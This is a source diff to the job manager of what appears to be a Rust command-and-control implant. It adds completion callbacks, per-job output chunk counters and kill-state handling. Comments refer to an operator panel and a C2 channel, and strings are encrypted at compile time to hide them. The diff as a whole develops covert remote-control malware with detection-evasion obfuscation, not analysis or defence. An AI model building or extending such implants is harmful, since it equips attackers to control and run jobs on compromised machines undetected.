@@ -5,7 +5,7 @@
 // unique ID and can be listed, polled, or killed from the operator panel.
 
 use std::collections::HashMap;
-use std::sync::Arc;
+use std::sync::{Arc, Mutex};
 use crate::strcrypt_rt;
 use strcrypt::aes_str;
 use tokio::sync::mpsc;
@@ -101,6 +101,8 @@ struct JobEntry {
     /// Final combined output (populated when the task finishes).
     final_output: Option<String>,
     final_error: Option<String>,
+    /// Live chunk counter shared with the job's JobOutputSink.
+    chunk_count: Arc<std::sync::atomic::AtomicUsize>,
 }
 
 // ── Manager ────────────────────────────────────────────────────────────
@@ -110,6 +112,10 @@ pub struct JobManager {
     next_id: u32,
     /// Cloned C2 sender - job tasks use this to push streamed results.
     c2_tx: mpsc::Sender<Vec<u8>>,
+    /// Weak self-reference so per-job supervisor tasks can report completion
+    /// back into the manager. Set by new_shared(); plain new() instances get
+    /// no completion callbacks (supervisor still sends JOB_FINAL upstream).
+    self_ref: Option<std::sync::Weak<Mutex<JobManager>>>,
 }
 
 impl JobManager {
@@ -118,7 +124,19 @@ impl JobManager {
             jobs: HashMap::new(),
             next_id: 1,
             c2_tx,
+            self_ref: None,
         }
+    }
+
+    /// Create a shared manager wired for self-completion: supervisors of
+    /// spawned jobs mark their entries Completed/Failed when they finish.
+    pub fn new_shared(c2_tx: mpsc::Sender<Vec<u8>>) -> Arc<Mutex<Self>> {
+        let mgr = Arc::new(Mutex::new(Self::new(c2_tx)));
+        let weak = Arc::downgrade(&mgr);
+        if let Ok(mut guard) = mgr.lock() {
+            guard.self_ref = Some(weak);
+        }
+        mgr
     }
 
     // ── spawn ──────────────────────────────────────────────────────────
@@ -139,14 +157,13 @@ impl JobManager {
         self.next_id += 1;
 
         let tx = self.c2_tx.clone();
+        let chunk_count = Arc::new(std::sync::atomic::AtomicUsize::new(0));
         let sink = JobOutputSink {
             job_id,
             req_id,
             tx: tx.clone(),
-            chunk_count: Arc::new(std::sync::atomic::AtomicUsize::new(0)),
+            chunk_count: chunk_count.clone(),
         };
-
-        let _chunk_counter = sink.chunk_count.clone();
 
         let handle: JoinHandle<(String, String, i32)> = tokio::spawn(async move {
             work(sink).await
@@ -154,9 +171,11 @@ impl JobManager {
 
         let abort = handle.abort_handle();
 
-        // Supervisor task: waits for the job to finish and sends the final
-        // CommandResponse back to the server.
+        // Supervisor task: waits for the job to finish, reports completion to
+        // the manager (so jobs:list/jobs:purge see the real state), then sends
+        // the final CommandResponse back to the server.
         let tx_final = tx.clone();
+        let mgr_weak = self.self_ref.clone();
         tokio::spawn(async move {
             let result = handle.await;
             let (output, error, exit_code) = match result {
@@ -168,6 +187,12 @@ impl JobManager {
                     (String::new(), format!("{}{}{}{}", strcrypt::aes_str!("[Job "), job_id, strcrypt::aes_str!("] Panicked: "), e), -1)
                 }
             };
+
+            if let Some(mgr) = mgr_weak.and_then(|w| w.upgrade()) {
+                if let Ok(mut guard) = mgr.lock() {
+                    guard.mark_finished(job_id, &output, &error);
+                }
+            }
 
             let resp = CommandResponse {
                 request_id: req_id,
@@ -193,6 +218,7 @@ impl JobManager {
             pending_output: Vec::new(),
             final_output: None,
             final_error: None,
+            chunk_count,
         });
 
         job_id
@@ -201,7 +227,11 @@ impl JobManager {
     // ── list ───────────────────────────────────────────────────────────
 
     pub fn list(&self) -> Vec<JobInfo> {
-        self.jobs.values().map(|e| e.info.clone()).collect()
+        self.jobs.values().map(|e| {
+            let mut info = e.info.clone();
+            info.chunks_sent = e.chunk_count.load(std::sync::atomic::Ordering::Relaxed);
+            info
+        }).collect()
     }
 
     pub fn list_json(&self) -> String {
@@ -225,16 +255,22 @@ impl JobManager {
         }
     }
 
-    // ── mark_finished (called by supervisor logic or process_response) ─
+    // ── mark_finished (called by the per-job supervisor task) ─────────
 
     pub fn mark_finished(&mut self, job_id: u32, output: &str, error: &str) {
         if let Some(entry) = self.jobs.get_mut(&job_id) {
+            // A job killed via jobs:kill is already marked Killed; the
+            // supervisor's cancelled-task report must not resurrect it.
+            if entry.info.status != JobStatus::Running {
+                return;
+            }
             entry.info.status = if error.is_empty() {
                 JobStatus::Completed
             } else {
                 JobStatus::Failed
             };
             entry.info.finished_at = Some(Utc::now().to_rfc3339());
+            entry.info.chunks_sent = entry.chunk_count.load(std::sync::atomic::Ordering::Relaxed);
             entry.final_output = Some(output.to_string());
             entry.final_error = Some(error.to_string());
         }
